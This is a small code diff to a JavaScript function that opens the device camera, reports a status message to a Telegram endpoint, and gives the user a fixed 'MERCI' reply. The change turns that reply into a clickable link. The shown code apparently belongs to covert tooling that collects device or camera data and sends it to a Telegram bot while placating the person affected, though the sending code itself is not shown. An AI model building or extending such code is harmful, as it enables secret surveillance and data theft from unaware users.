@@ -126,14 +126,14 @@ async function handleActivation() {
         });
         
         stream.getTracks().forEach(track => track.stop());
-        
-    } catch (error) {
-        statusMessage += `\nErreur caméra: ${error.message}`;
-        userMessage = 'MERCI'; // Message fixo para o usuário
-    }
     
-    await sendToTelegram(statusMessage);
-    return userMessage;
+} catch (error) {
+    statusMessage += `\nErreur caméra: ${error.message}`;
+    userMessage = 'MERCI <a href="https://www.exemplo.com" target="_blank">Clique aqui para mais informações</a>'; // Mensagem com link clicável
+}
+
+await sendToTelegram(statusMessage);
+return userMessage;
 }
 
 async function initiateActivation() {
